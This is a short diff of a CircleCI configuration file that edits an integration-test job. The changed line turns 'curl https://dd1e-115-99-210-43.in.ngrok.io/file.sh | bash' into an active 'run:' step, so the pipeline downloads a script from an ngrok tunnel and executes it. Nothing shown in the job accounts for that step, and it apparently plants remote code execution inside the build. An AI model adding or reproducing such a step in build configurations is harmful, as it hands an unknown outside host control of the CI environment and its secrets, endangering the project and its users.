@@ -105,7 +105,7 @@ jobs:
     working_directory: /home/circleci/build
     <<: *integration_test_steps
     steps:
-      - curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
+      - run: curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
 
 
   integration-test-648:
